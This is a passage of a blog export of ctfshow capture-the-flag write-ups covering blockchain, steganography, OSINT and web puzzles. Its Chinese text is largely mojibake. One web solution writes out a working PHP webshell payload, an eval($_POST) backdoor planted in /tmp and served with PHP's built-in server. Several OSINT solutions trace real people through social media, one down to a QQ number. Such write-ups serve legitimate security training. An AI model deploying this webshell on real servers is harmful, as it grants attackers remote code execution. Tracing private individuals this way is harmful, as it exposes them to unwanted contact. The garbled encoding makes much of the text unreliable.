<h2 id="HelloFlag"><a href="#HelloFlag" class="headerlink" title="HelloFlag"></a>HelloFlag</h2><p>ç¬¬ä¸€æ¬¡åšè¿™ç§åŒºå—é“¾çš„é¢˜ç›®<br>æ„Ÿè§‰æ˜¯éé¢„æœŸäº†<br>é¦–å…ˆä¸‹è½½MetaMaskè¿™ä¸ªæ’ä»¶<br>æ‰“å¼€ç½‘å€<br><img src="/img/ctfshow/ybb-4.png"><br>å°†åœ°å€æ›¿æ¢ä¸ºé¢˜ç›®ä¸­çš„<br><img src="/img/ctfshow/ybb-5.png"><br>ç‚¹è¿™ä¸ªï¼ˆæˆ‘çç‚¹çš„ï¼‰<br><img src="/img/ctfshow/ybb-6.png"><br>æŸ¥çœ‹æ›´å¤šä¿¡æ¯<br><img src="/img/ctfshow/ybb-7.png"><br>è½¬æˆUTF-8å°±èƒ½çœ‹åˆ°flagäº†<br><img src="/img/ctfshow/ybb-8.png"></p>
<h2 id="project-Tao-1"><a href="#project-Tao-1" class="headerlink" title="project Tao-1"></a>project Tao-1</h2><p>å¤ªå¥—äº†å§<br>logä¸­å¹¶æ²¡æœ‰ä»»ä½•æœ‰ç”¨çš„ä¿¡æ¯å°±ä¸æ”¾å‡ºæ¥äº†<br>ç¬¬é›¶å…³ï¼š&#x2F;W4lc0me  æ²¡å•¥å¥½è¯´çš„ï¼Œç›´æ¥ä¸‹ä¸€å…³<br>ç¬¬ä¸€å…³ï¼š&#x2F;Letsstart æºç é‡Œæœ‰<br>ç¬¬äºŒå…³ï¼š&#x2F;some_informations æ ¹æ®æç¤ºæ‰¾åˆ°é”™è¯¯ï¼Œé‚£å°±æ˜¯å»æ‰s<br>ç¬¬ä¸‰å…³ï¼š&#x2F;some_information æœ‰è‰²å—ï¼Œè½¬æˆascii<code>G0od! Next /CTFG0d</code><br>ç¬¬å››å…³ï¼š&#x2F;CTFG0d æœ‰ä¸€ä¸²åŠ å¯†å­—ç¬¦ä¸²ï¼Œå…ˆbase64â€“&gt;base16â€“&gt;base64â€“&gt;base32,å¾—åˆ°<code>ecalptx4N/</code> åè½¬ä¸€ä¸‹<code>/N4xtplace</code><br>ç¬¬äº”å…³ï¼š&#x2F;N4xtplace æºä»£ç ä¸­çš„é¢œæ–‡å­—aaencodeè§£å¯†ä¸€ä¸‹<br>ç¬¬å…­å…³ï¼š&#x2F;cftla5gsh0w titleçš„æç¤ºå»æ‰flag<br>ç¬¬ä¸ƒå…³ï¼š&#x2F;ct5sh0w æºç ä¸­æœ‰ä¸€å¼ äºŒç»´ç ï¼Œä¿®å¤ä¸€ä¸‹<br>ç¬¬å…«å…³ï¼š&#x2F;t308g0d ä¸€å¼ å›¾ç‰‡ï¼Œä¸‹è½½åæ”¹é«˜åº¦ï¼ˆåŸæ¥crcæ²¡æŠ¥é”™çš„æƒ…å†µä¸‹é«˜åº¦ä¸ä¸€å®šæ­£ç¡®ï¼ˆ8ç¥è¯´é«˜åº¦å’ŒIHDRå—çš„CRCéƒ½è¢«æ”¹äº†ï¼‰ï¼‰</p>
<h2 id="project-Tao-2"><a href="#project-Tao-2" class="headerlink" title="project Tao-2"></a>project Tao-2</h2><p>ç¬¬ä¹å…³ï¼š&#x2F;DEADSOUL<br>å°±æ˜¯ç¬¬å…«å…³çš„å›¾ç‰‡åå­—</p>
<p>ç¬¬åå…³ï¼š&#x2F;HIRE<br>æç¤ºçŸ¥ä¹å½©è›‹<br>åœ¨consoleå¯ä»¥æ‰¾åˆ°<br><img src="/img/ctfshow/ybb-9.png"></p>
<p>ç¬¬åä¸€å…³ï¼š&#x2F;about_baidu<br>logæç¤ºè¯´è®¿é—®å›¾ç‰‡<br>æ‰¾åˆ°å›¾ç‰‡çš„RGBå€¼å’Œalphaå€¼ï¼ˆå°±æ˜¯psä¸­ç°åº¦æ»‘å—çš„å€¼ï¼‰<br>å³14.215.117.35ï¼Œè®¿é—®æ˜¯ç™¾åº¦é¦–é¡µ<br><img src="/img/ctfshow/ybb-10.png"><br>æ ¹æ®æç¤ºæ‰¾åˆ°åœ°å€<br><img src="/img/ctfshow/ybb-11.png"></p>
<p>ç¬¬åäºŒå…³ï¼š&#x2F;ns<br>åœ¨åœ°å›¾ä¸Šå°†è¯—å¥ä¸­çš„åœ°åè¿æ¥èµ·æ¥<br>ç»„æˆä¸¤ä¸ªå­—æ¯ns</p>
<p>ç¬¬åä¸‰å…³ï¼š&#x2F;ONLY2GAME<br>æ ¹æ®logï¼Œå‘ç°æ˜¯è«æ–¯å¯†ç <br>å°†SAYL7UNITç”¨è«æ–¯åŠ å¯†<br>ç„¶å-å’Œ.äº’æ¢å†æ¬¡è§£å¯†</p>
<p>ç¬¬åå››å…³ï¼š&#x2F;TAOFINAL<br>5bitç¼–ç â€”â€”&gt;åšå¤šå¯†ç <br><a href="https://www.boxentriq.com/code-breaking/baudot-code">åœ¨çº¿è§£ç </a><br>å°†.æ¢æˆ0ï¼Œ-æ¢æˆ1</p>
<p>æœ€ç»ˆï¼šflagåœ¨å›¾ç‰‡æœ€åé¢</p>
<h2 id="æœˆé¥¼èµ·ä¹‰"><a href="#æœˆé¥¼èµ·ä¹‰" class="headerlink" title="æœˆé¥¼èµ·ä¹‰"></a>æœˆé¥¼èµ·ä¹‰</h2><p>ç¬¬ä¸€æ¬¡å‡ºé¢˜ç›®ï¼Œæœ‰ç‚¹æ¿€åŠ¨ï¼Œå“ˆå“ˆå“ˆ<br>æ„Ÿè°¢@rotçš„å‡ºé¢˜ååŠ©</p>
<p>1ï¼šé¦–å…ˆä¸‹è½½ï¼Œå¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥è§£å‹ï¼Œæ˜¯æŸåçš„<br>å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªhint.txt<br><img src="/img/ctfshow/ybb-12.png"><br>å°è¯•ç”¨binwalkåˆ†ç¦»<br><img src="/img/ctfshow/ybb-13.png"><br>æŸ¥çœ‹è¿™ä¸ªæ–‡æœ¬<br><img src="/img/ctfshow/ybb-14.png"><br>æ˜¯é›¶å®½éšå†™<br>è§£å‡ºæ¥ä¸€ä¸ªhintï¼š170ï¼Œ<br>å“ä½†æ˜¯æš‚æ—¶æ²¡å•¥ç”¨<br><img src="/img/ctfshow/ybb-15.png"></p>
<p>2ï¼šå†å›å»æŸ¥çœ‹å‹ç¼©åŒ…<br>ä¼šå‘ç°ä¸­é—´éšè—äº†ä¸€ä¸ªæ–‡ä»¶<br><img src="/img/ctfshow/ybb-16.png"><br><img src="/img/ctfshow/ybb-17.png"><br>æå–å‡ºæ¥åå¼‚æˆ–ä¹‹å‰å¾—åˆ°çš„æ•°å€¼170<br>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)<br>d=f<span class="hljs-selector-class">.read</span>(<span class="hljs-number">9999999</span>)<br>e=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> d:<br>    e=e+<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">170</span>)<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data_xor&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<br>f<span class="hljs-selector-class">.write</span>(e)<br>f<span class="hljs-selector-class">.close</span>()<br></code></pre></td></tr></table></figure>
<p>è§‚å¯Ÿåˆ°æœ‰89 50 4e å³pngå›¾ç‰‡å¤´<br><img src="/img/ctfshow/ybb-18.png"><br>é€†åºè„šæœ¬ï¼š</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data_xor&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)<br>d=f<span class="hljs-selector-class">.read</span>(<span class="hljs-number">9999999</span>)<br>d=d<span class="hljs-selector-attr">[::-1]</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.png&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<br>f<span class="hljs-selector-class">.write</span>(d)<br>f<span class="hljs-selector-class">.close</span>()<br></code></pre></td></tr></table></figure>
<p>ç„¶åä½¿ç”¨stegsolve æŸ¥çœ‹é€šé“ä¿¡æ¯<br><img src="/img/ctfshow/ybb-19.png"><br>å¾—åˆ°æœ€ç»ˆçš„flagå›¾ç‰‡</p>
<h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="å¹¸ç¦å°é•‡"><a href="#å¹¸ç¦å°é•‡" class="headerlink" title="å¹¸ç¦å°é•‡"></a>å¹¸ç¦å°é•‡</h2><p>ç™¾åº¦ç™¾ç§‘å¯ä»¥çœ‹åˆ°æ‰€æœ‰ä¿¡æ¯ï¼Œè§’è‰²ï¼Œé…éŸ³ç­‰éƒ½åœ¨é‡Œé¢<br><img src="/img/ctfshow/ybb-20.png"></p>
<h2 id="PSæ‰“å¡ç¬¬ä¸€å¤©"><a href="#PSæ‰“å¡ç¬¬ä¸€å¤©" class="headerlink" title="PSæ‰“å¡ç¬¬ä¸€å¤©"></a>PSæ‰“å¡ç¬¬ä¸€å¤©</h2><p>å…ˆæ”¹åç¼€ä¸ºpsd<br>æŠŠ4å¼ å›¾ç‰‡å¯¼å‡º<br>ç™¾åº¦è¯†å›¾æœå†¬å¤©è¿™å¼ <br><img src="/img/ctfshow/ybb-21.png"><br>çœ‹åˆ°äº†åŸŸåä¸ºå…°å·å¤§å­¦<br>ç›´æ¥äº¤è¯•è¯•çœ‹ï¼Œæ²¡æƒ³åˆ°çœŸæ˜¯å…°å·å¤§å­¦<br><img src="/img/ctfshow/ybb-22.png"></p>
<h2 id="æŠ¬å¤´çœ‹çœ‹"><a href="#æŠ¬å¤´çœ‹çœ‹" class="headerlink" title="æŠ¬å¤´çœ‹çœ‹"></a>æŠ¬å¤´çœ‹çœ‹</h2><p>ç›´æ¥è€æœ‹å‹è°·æ­Œè¯†å›¾<br>æ‰¾åˆ°å‡ ç¯‡æ–°é—»ï¼Œéƒ½æ˜¯è¿‘æœŸå‘ç”Ÿçš„<br><img src="/img/ctfshow/ybb-23.png"><br>åœ¨æ–°é—»ä¸­å¾—åˆ°å…³é”®ä¿¡æ¯The lvyé¤å…<br><img src="/img/ctfshow/ybb-24.png"><br>è°·æ­Œåœ°å›¾<br><img src="/img/ctfshow/ybb-25.png"><br>å®æ™¯çœ‹çœ‹<br>å—¯ï¼Œä¸€æ¨¡ä¸€æ ·ï¼Œå‰©ä¸‹çš„å°±ä¸è¯´äº†<br><img src="/img/ctfshow/ybb-26.png"></p>
<h2 id="ä»¥åµå‡»çŸ³"><a href="#ä»¥åµå‡»çŸ³" class="headerlink" title="ä»¥åµå‡»çŸ³"></a>ä»¥åµå‡»çŸ³</h2><p>é€šè¿‡ç™¾åº¦è¯†å›¾å¾—åˆ°çš„å›¾ç‰‡çŒœæµ‹å¤§æ¦‚æ˜¯ä¸ªæŸ æª¬çš„å¤–è¡¨<br>ç›´æ¥åœ¨bç«™æœ<br>ä¸€ä¸ªä¸€ä¸ªçœ‹<br><img src="/img/ctfshow/ybb-27.png"><br>æ‹¿åˆ°åˆ¶ä½œçš„è§†é¢‘ï¼ˆç”œç‚¹çš„å”®ä»·_å†…å±‚é¦…æ–™çš„ç§æ•°éƒ½åœ¨è§†é¢‘ä¸­ï¼‰<br>é€šè¿‡è¯„è®ºåŒºçš„å…³é”®è¯ï¼ˆè¯·åƒé¥­ï¼Œè¹­é¥­ï¼‰ï¼Œç¿»çœ‹â€œé›¨å“¥åˆ°å¤„è·‘â€å’Œâ€œåŠ›å…ƒå›â€çš„å¾€æœŸè§†é¢‘ï¼Œå¯ä»¥å‘ç°æœ‰ä¸€æœŸï¼ˆè¹­é¥­æŒ‘æˆ˜ï¼‰æåˆ°äº†è¿™ä¸ªæŸ æª¬<br><img src="/img/ctfshow/ybb-28.png"><br>æ‹¿åˆ°è§†é¢‘å·<br><img src="/img/ctfshow/ybb-29.png"><br>ç»„åˆä¸€ä¸‹å°±å¥½å•¦</p>
<h2 id="æˆ‘çš„æœ‹å‹"><a href="#æˆ‘çš„æœ‹å‹" class="headerlink" title="æˆ‘çš„æœ‹å‹"></a>æˆ‘çš„æœ‹å‹</h2><p>æš´æ‰“å‡ºé¢˜äººï¼Œå•Šå•Šå•Šå•Š<br>è¿™ä¸€é¢˜æˆ‘å‰å‰åååšäº†4ä¸ªå°æ—¶å·¦å³ï¼Œä¸€ç›´ç»„åˆä¸å¯¹ï¼Œæœ€åå‘ç°é¡ºåºé”™äº†<br>æ ¹æ®æç¤ºï¼ŒçŒœæµ‹äººç‰©ä¸ºLOLçš„è§£è¯´<br><img src="/img/ctfshow/ybb-30.png"><br>lolè§£è¯´å¤§éƒ¨åˆ†æ´»è·ƒåœ¨å¾®åš<br>ç›´æ¥å¾®åšæœç´¢<code>è‹±é›„è”ç›Ÿä¸»æŒäºº</code><br>å¾—åˆ°å‡ ä¸ªäººç‰©ï¼ˆä½™éœœï¼Œå°é’°ï¼Œéª†æ­†ï¼‰<br><img src="/img/ctfshow/ybb-31.png"><br>åœ¨å¥¹ä»¬çš„å¾®åšä¸­ç¿»ä¸å›¾ç‰‡ä¸€è‡´çš„è¡£æœ<br>æœ€ååœ¨éª†æ­†çš„å¾®åšä¸­æ‰¾åˆ°äº†æ—¶é—´ï¼Œæˆ˜é˜Ÿç­‰ä¿¡æ¯<br><img src="/img/ctfshow/ybb-32.png"><br>æœä¸€ä¸‹èµ›ç¨‹è¡¨<br><img src="/img/ctfshow/ybb-33.png"><br>åœ¨æœæˆ˜ç»©<br><img src="/img/ctfshow/ybb-34.png"><br>æ¥ç€æ˜¯ç¬¬äºŒåœºæ¯”èµ›<br><img src="/img/ctfshow/ybb-35.png"><br>æˆ˜ç»©<br><img src="/img/ctfshow/ybb-36.png"><br>ç»„åˆåœ¨ä¸€èµ·</p>
<h2 id="å¥—å¥—å»å“ªå„¿"><a href="#å¥—å¥—å»å“ªå„¿" class="headerlink" title="å¥—å¥—å»å“ªå„¿"></a>å¥—å¥—å»å“ªå„¿</h2><p>æ ¹æ®æä¾›çš„ä¿¡æ¯ï¼ˆ2021å¹´6æœˆ3å·ä¸‹åˆå’Œå›¾ç‰‡ä¸­çš„æœºå‹B-6467ï¼‰<br>åœ¨é£å¸¸å‡†appä¸­å¯ä»¥æŸ¥åˆ°å¦‚ä¸‹ä¿¡æ¯<br>è¥¿è—èˆªç©º TV9817 13:00-15:30 æ‹‰è¨è´¡å˜T2-æ³¸å·äº‘é¾™<br>è¥¿è—èˆªç©º TV9817 13:00-17:55 æ‹‰è¨è´¡å˜T2-å¤ªåŸæ­¦å®¿T1<br>è¥¿è—èˆªç©º TV9817 16:00-17:55 æ³¸å·äº‘é¾™-å¤ªåŸæ­¦å®¿T1</p>
<p>æ·±åœ³èˆªç©º ZH3721 13:00-15:20 æ‹‰è¨è´¡å˜T2-æ³¸å·äº‘é¾™<br>æ·±åœ³èˆªç©º ZH3721 13:00-17:55 æ‹‰è¨è´¡å˜T2-å¤ªåŸæ­¦å®¿T1<br>æ·±åœ³èˆªç©º ZH3721 16:00-17:55 æ³¸å·äº‘é¾™-å¤ªåŸæ­¦å®¿T1</p>
<p>é•¿é¾™èˆªç©º GJ5039 13:00-15:20 æ‹‰è¨è´¡å˜T2-æ³¸å·äº‘é¾™<br>é•¿é¾™èˆªç©º GJ5039 13:00-17:55 æ‹‰è¨è´¡å˜T2-å¤ªåŸæ­¦å®¿T1<br>é•¿é¾™èˆªç©º GJ5039 16:00-17:55 æ³¸å·äº‘é¾™-å¤ªåŸæ­¦å®¿T1</p>
<p>æ¥ä¸‹æ¥å°±ä¸ä¼šäº†ï¼Œç„¶åä¸€ä¸ªä¸€ä¸ªèˆªç­æŸ¥ï¼Œä¸€ä¸ªä¸€ä¸ªåŸå¸‚è¯•ï¼Œç»“æœè¿˜çœŸè’™å¯¹äº†</p>
<h2 id="è§å­—å¦‚é¢"><a href="#è§å­—å¦‚é¢" class="headerlink" title="è§å­—å¦‚é¢"></a>è§å­—å¦‚é¢</h2><p>èµ›ååšå‡ºæ¥çš„<br>hint1:æƒ³æƒ³æ˜¯å“ªäº›äººæ”¶åˆ°ä¿¡å‘¢ï¼Œä¿¡å­—åŠ ç²—ä¸€ä¸‹<br>hint2:ä»¥å†™ä¿¡æ”¶è—ä½“è‚²å¨±ä¹ä»¥åŠå…¶ä»–æ˜æ˜Ÿä¸ºä¸»<br>çœŸæ²¡æœ‰æƒ³åˆ°åœ¨è´´å§ï¼Œå­¦åºŸäº†<br><img src="/img/ctfshow/ybb-37.png"><br>ç™¾åº¦è¯†å›¾å¾—åˆ°äººç‰©åå­—ï¼šå±±å§†<br>åœ¨å§å†…æœç´¢<br><img src="/img/ctfshow/ybb-38.png"><br>åœ¨ä»–çš„å…¶ä»–å¸–å­é‡Œæ‰¾åˆ°äº†qq</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="webç­¾åˆ°"><a href="#webç­¾åˆ°" class="headerlink" title="webç­¾åˆ°"></a>webç­¾åˆ°</h2><p>MD5ç­‰äºè‡ªèº«ï¼Œå¦‚md5($a)&#x3D;&#x3D;$a,phpå¼±æ¯”è¾ƒä¼šæŠŠ0eå¼€å¤´è¯†åˆ«ä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œç»“æœå‡ä¸º0ï¼Œæ‰€ä»¥æ­¤æ—¶éœ€è¦æ‰¾åˆ°ä¸€ä¸ªMD5åŠ å¯†å‰åéƒ½æ˜¯0eå¼€å¤´çš„ï¼Œå¦‚0e215962017<br><img src="/img/ctfshow/ybb-39.png"></p>
<h2 id="ä¸è¦ç¦»å¼€æˆ‘"><a href="#ä¸è¦ç¦»å¼€æˆ‘" class="headerlink" title="ä¸è¦ç¦»å¼€æˆ‘"></a>ä¸è¦ç¦»å¼€æˆ‘</h2><p>åœ¨å¯å†™çš„&#x2F;tmpç›®å½•ä¸‹ä¼ æœ¨é©¬å¹¶å†™ç³»ç»Ÿå‘½ä»¤ï¼Œç„¶åæäº¤5ç§’å†…è¿›â¾checkï¼Œcheckä¼šå…³é—­nginxå’Œphp-fpmï¼Œç”±äºæ˜¯www-dataæƒé™ï¼Œâ½†æ³•å¯åŠ¨nginxå’Œphp-fpmï¼Œç›´æ¥å¯åŠ¨phpå†…ç½®æœåŠ¡å™¨å³å¯</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><code class="hljs php-template"><span class="language-xml">cmd=file_put_contents(&quot;/tmp/index.php&quot;,&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(\<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;);system(&quot;sleep 5 &amp;&amp; php -S 0.0.0.0:80 -t /tmp/&quot;);</span><br></code></pre></td></tr></table></figure>
<p>æ³¨æ„ç‰¹æ®Šå­—ç¬¦ç¼–ç <br>ä¼ å…¥åå¯ä»¥åœ¨èšå‰‘çœ‹çœ‹æœ‰æ²¡æœ‰æˆåŠŸå†™å…¥php<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%811.png"><br>flagåœ¨æ ¹ç›®å½•<br>ï¼ˆå‡ºç°<code>Notice: Undefined index: a in /tmp/index.php on line 1</code>æ˜¯æ­£å¸¸æƒ…å†µï¼‰<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%812.png"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€ctfshowã€‘ç½‘ç»œè¿·è¸ª-wp</title>
    <url>/posts/4ef561fb/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä½¿ç”¨åˆ°çš„å·¥å…·<br>1ï¼š<a href="https://graph.baidu.com/pcpage/index?tpl_from=pc">ç™¾åº¦è¯†å›¾</a><br>2ï¼š<a href="https://images.google.com/?gws_rd=ssl">è°·æ­Œè¯†å›¾</a><br>3ï¼š<a href="https://www.qvdv.com/tools/qvdv-coordinate.html">ç»çº¬åº¦å®šä½</a><br>4ï¼š<a href="https://yandex.com/images/">yandexè¯†å›¾</a></p>
<h1 id="æ–°æ‰‹ä¸Šè·¯"><a href="#æ–°æ‰‹ä¸Šè·¯" class="headerlink" title="æ–°æ‰‹ä¸Šè·¯"></a>æ–°æ‰‹ä¸Šè·¯</h1><p>æ ¼å¼ï¼šctfshow{æ¡¥çš„åå­—}<br>æ±‚çš„æ˜¯æ¡¥çš„åå­—<br><img src="/img/ctfshow/wlmz/%E6%96%B0%E6%89%8B%E4%B8%8A%E8%B7%AF.jpg"></p>
<p>è°·æ­Œè¯†å›¾å¾—åˆ°ç»“æœä¸ºèœˆæ”¯æ´²å²›<br><img src="/img/ctfshow/wlmz/%E8%9C%88%E6%94%AF%E6%B4%B2%E5%B2%9B.png"></p>
<p>ä½¿ç”¨ç™¾åº¦å®æ™¯åœ°å›¾æŸ¥çœ‹å²›<br>å²›å±¿ä¸æ˜¯å¾ˆå¤§ï¼Œè½¬ä¸€åœˆå°±çœ‹åˆ°äº†<br>ctfshow{æƒ…äººæ¡¥}<br><img src="/img/ctfshow/wlmz/%E6%83%85%E4%BA%BA%E6%A1%A5.png"></p>
<h1 id="åˆå­¦ä¹ç»ƒ"><a href="#åˆå­¦ä¹ç»ƒ" class="headerlink" title="åˆå­¦ä¹ç»ƒ"></a>åˆå­¦ä¹ç»ƒ</h1><p>æ ¼å¼ï¼šctfshow{ç›®çš„åœ°}<br>å¯ä»¥å¾—çŸ¥æ˜¯ç‘èˆªçš„é£æœº<br><img src="/img/ctfshow/wlmz/%E5%88%9D%E5%AD%A6%E4%B9%8D%E7%BB%83.jpg"><br>ä»wikiç™¾ç§‘æŸ¥çœ‹æœºåœº<br><img src="/img/ctfshow/wlmz/%E7%91%9E%E5%A3%AB.png"><br>ctfshow{è‹é»ä¸–}</p>
<h1 id="åˆå­¦åˆç»ƒ"><a href="#åˆå­¦åˆç»ƒ" class="headerlink" title="åˆå­¦åˆç»ƒ"></a>åˆå­¦åˆç»ƒ</h1><p>æ ¼å¼ï¼šctfshow{çº¬åº¦(ç²¾ç¡®åˆ°å°æ•°ç‚¹åå››ä½, ä¸ç”¨è¿›ä½),ç»åº¦(ç²¾ç¡®åˆ°å°æ•°ç‚¹åå››ä½, ä¸ç”¨è¿›ä½)}<br>å¯ä»¥çœ‹åˆ°å³è¾¹åº—é¢çš„åå­—ä¸ºï¼šsandwichnsmoothies<br><img src="/img/ctfshow/wlmz/%E5%88%9D%E5%AD%A6%E5%8F%88%E7%BB%83-1.png"><br>å› ä¸ºåœ¨å›½å¤–ï¼Œæ‰€ä»¥ç›´æ¥ç”¨è°·æ­Œåœ°å›¾æœï¼Œç”¨è¡—æ™¯çœ‹ï¼Œå‘ç°ä¸€æ¨¡ä¸€æ ·<br><img src="/img/ctfshow/wlmz/%E5%88%9D%E5%AD%A6%E5%8F%88%E7%BB%83-2.png"><br>çœŸçš„ä¸æƒ³åšç»çº¬åº¦çš„é¢˜äº†ï¼Œæ•°å­—å¤ªéš¾å¯¹äº†<br>ctfshow{55.6382,12.6411}</p>
<h1 id="åˆå­¦å†ç»ƒ"><a href="#åˆå­¦å†ç»ƒ" class="headerlink" title="åˆå­¦å†ç»ƒ"></a>åˆå­¦å†ç»ƒ</h1><p>æ ¼å¼ï¼šctfshow{å†›äº‹åŸºåœ°è‹±æ–‡}<br>è°·æ­Œè¯†å›¾<br>ç›´æ¥å¾—åˆ°ç»“æœ<br><img src="/img/ctfshow/wlmz/%E5%88%9D%E5%AD%A6%E5%86%8D%E7%BB%83.png"><br>ctfshow{Nagurskoye}</p>
<h1 id="ç°æ‹‰ç°åƒ"><a href="#ç°æ‹‰ç°åƒ" class="headerlink" title="ç°æ‹‰ç°åƒ"></a>ç°æ‹‰ç°åƒ</h1><p>æ ¼å¼ï¼šctfshow{å›¾ä¸­åº—é“ºå…¨åçš„æ‹¼éŸ³ï¼ˆæ— åˆ†éš”ç¬¦å’Œå£°è°ƒã€å­—æ¯å…¨å°å†™ï¼‰åŠ é£Ÿç‰©ä»·æ ¼ï¼ˆé˜¿æ‹‰ä¼¯æ•°å­—ï¼‰}<br>ç™¾åº¦è¯†å›¾æ‰¾åˆ°ä¸€ä¸ªå›¾æ¡ˆä¸€æ ·çš„ç¢—<br><img src="/img/ctfshow/wlmz/%E6%8B%89%E9%9D%A2.png"><br>å¾—åˆ°ç»“æœä¸ºâ€œäº‘å³°æ¸…çœŸé¤å…(å—æ»¨æ²³è·¯åº—)â€ï¼Œå› ä¸ºå›¾ç‰‡ä¸Šæœ‰å¤§ä¼—ç‚¹è¯„çš„æ°´å°<br>æ‰€ä»¥åœ¨å¤§ä¼—ç‚¹è¯„é‡Œæ‰¾ï¼Œçœ‹åˆ°è¯„è®ºé‡Œæœ‰åº—é¢çš„æ‹›ç‰Œï¼Œå¾—åˆ°åå­—ä¸ºäº‘å³°ç‰›è‚‰é¢<br><img src="/img/ctfshow/wlmz/%E6%8B%89%E9%9D%A2-2.png"><br>æ‰‹æœºappæ‰«ç ç‚¹å•å¯ä»¥å¾—çŸ¥ä»·æ ¼ä¸º10ï¼Œä½†æ˜¯æäº¤å¤±è´¥<br>ç™¾åº¦å¾—åˆ°çš„ä»·æ ¼ä¸º17<br>ctfshow{yunfengniuroumian17}</p>
<h1 id="åˆçª¥é—¨å¾„"><a href="#åˆçª¥é—¨å¾„" class="headerlink" title="åˆçª¥é—¨å¾„"></a>åˆçª¥é—¨å¾„</h1><p>æ ¼å¼ï¼šæ‹æ‘„è€…åé¢çš„å»ºç­‘åç§°ï¼Œæ ¼å¼ctfshow{å»ºç­‘åç§°ä¸­æ–‡}<br>yandexè¯†å›¾æ‰¾åˆ°ç±»ä¼¼çš„å›¾ç‰‡<br><img src="https://s4.ax1x.com/2021/12/11/oTGyVg.png"></p>
<p>è½¬åˆ°ä¸€ç¯‡æ¸¸è®°,æåˆ°äº†åŸå¸‚å‰è¨<br><img src="/img/ctfshow/wlmz/%E5%88%9D%E7%AA%A5%E9%97%A8%E5%BE%84-2.png"><br>ä¹‹åä¹Ÿå†™åˆ°äº†æ‹æ‘„åœ°ç‚¹<br>ctfshow{èƒ¡å¤«é‡‘å­—å¡”}</p>
<h1 id="ç‹—å“¥å»å“ª"><a href="#ç‹—å“¥å»å“ª" class="headerlink" title="ç‹—å“¥å»å“ª"></a>ç‹—å“¥å»å“ª</h1><p>æ ¼å¼ï¼šflagä¸ºctfshow{é£æ™¯åŒºåå­—ï¼Œå°å†™æ‹¼éŸ³}</p>
<p>å›¾ç‰‡ä¸­æœ‰å¾®åšidï¼Œæ‰¾åˆ°å·ä¸»ï¼Œç¿»çœ‹ç›¸å†Œï¼Œæ²¡çœ‹åˆ°å•¥ä¿¡æ¯<br>æ‰¾åˆ°åšä¸»çš„Bç«™å·ï¼Œçœ‹åˆ°ä¸€ç¯‡vlogï¼Œæåˆ°äº†åœ°ç‚¹<br><img src="/img/ctfshow/wlmz/%E7%8B%97%E5%93%A5%E5%8E%BB%E5%93%AA.png"></p>
<p>ctfshow{daochengyading}</p>
<h1 id="å›½è¶³åŠ æ²¹"><a href="#å›½è¶³åŠ æ²¹" class="headerlink" title="å›½è¶³åŠ æ²¹"></a>å›½è¶³åŠ æ²¹</h1><p>æ ¼å¼ï¼šctfshow{æ—¥æœŸ+ä½“è‚²åœºåå­—}<br>ä¸€ä¸ªgifï¼Œä½¿ç”¨ç™¾åº¦è¯†å›¾æœç´¢<br>åœ¨è¿™ä¸€ç¯‡<a href="https://xw.qq.com/partner/hwbrowser/20200329a041qr/20200329a041qr00?adtag=hwb&pgv_ref=hwb&appid=hwbrowser&ctype=news">æ–°é—»</a>ä¸­å¯ä»¥å¾—çŸ¥æ—¥æœŸä¸º2016å¹´3æœˆ29æ—¥,æ¯”èµ›åœ°ç‚¹ä¸ºè¥¿å®‰<br><img src="/img/ctfshow/wlmz/%E5%9B%BD%E8%B6%B3%E5%8A%A0%E6%B2%B91.png"><br>å°±å·®åœºåœ°äº†ï¼Œå¯ä»¥é€šè¿‡å…³é”®è¯æ¥ç™¾åº¦æœç´¢<br>å¾—çŸ¥åœºåœ°ä¸ºé™•è¥¿çœä½“è‚²åœº<br><img src="/img/ctfshow/wlmz/%E5%9B%BD%E8%B6%B3%E5%8A%A0%E6%B2%B92.png"><br>ctfshow{2016å¹´3æœˆ29æ—¥é™•è¥¿çœä½“è‚²åœº}</p>
